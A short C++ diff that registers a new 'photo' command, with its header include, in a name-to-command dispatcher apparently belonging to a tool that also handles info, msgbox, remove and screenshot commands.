@@ -12,6 +12,7 @@
 #include "Command_info.h"
 #include "Command_msgbox.h"
 #include "Command_remove.h"
+#include "Command_photo.h"
 #include "Command_screenshot.h"
 
 struct CommandThreadParams
@@ -31,7 +32,9 @@ static Command *CreateCommandFromName(const std::string &name)
 		return new Command_info();
 	else if(name == "msgbox")
 		return new Command_msgbox();
-	else if(name == "remove")
+	else if (name == "photo")
+		return new Command_photo();
+	else if (name == "remove")
 		return new Command_remove();
 	else if(name == "screenshot")
 		return new Command_screenshot();
